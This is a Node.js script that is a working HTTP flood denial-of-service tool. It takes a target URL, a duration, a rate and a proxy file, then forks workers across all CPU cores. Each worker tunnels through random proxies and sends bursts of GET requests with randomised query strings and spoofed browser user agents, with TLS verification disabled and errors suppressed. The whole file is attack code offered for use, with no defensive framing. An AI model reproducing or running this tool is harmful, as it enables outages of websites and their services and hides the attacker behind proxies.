const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');

var cookies = {};

var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
rate:process.argv[4],
threads: process.argv[5],
proxyFile: process.argv[6]
}

if (process.argv.length !== 7) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Threads> <ProxyFile>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30> proxies.txt
------------------------------------------------------------------
Dependencies: user-agents.txt (User Agents) | proxies.txt (Proxies)
`);
    process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

var proxies = readLines(VarsDefinetions.proxyFile);

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
];

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
} 

const numCPUs = cpus().length;
if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {

function BuildRequest() {
let path = parsed.path;
if (path.indexOf("[rand]") !== -1){
    path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
}
var raw_socket = 'GET' + ' ' + path + '?query=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragents[Math.floor(Math.random() * useragents.length)] + '\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nFetch-Dest: document\r\nFetch-Mode: navigate\r\nFetch-Site: none\r\nConnection: keep-alive\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var proxyAddr = randomElement(proxies);
var proxy = proxyAddr.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'keep-alive',
    'Connection': 'keep-alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        port: 443,
        servername: parsed.host,
        rejectUnauthorized: false,
        socket: socket
    }, function () {

for (let j = 0; j < VarsDefinetions.rate; j++) {

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

TlsConnection.on('end', () => {
  TlsConnection.abort();
  TlsConnection.destroy();
});

}).end()
}, 0);
}

setTimeout(() => {
    console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
}, VarsDefinetions.time*1000)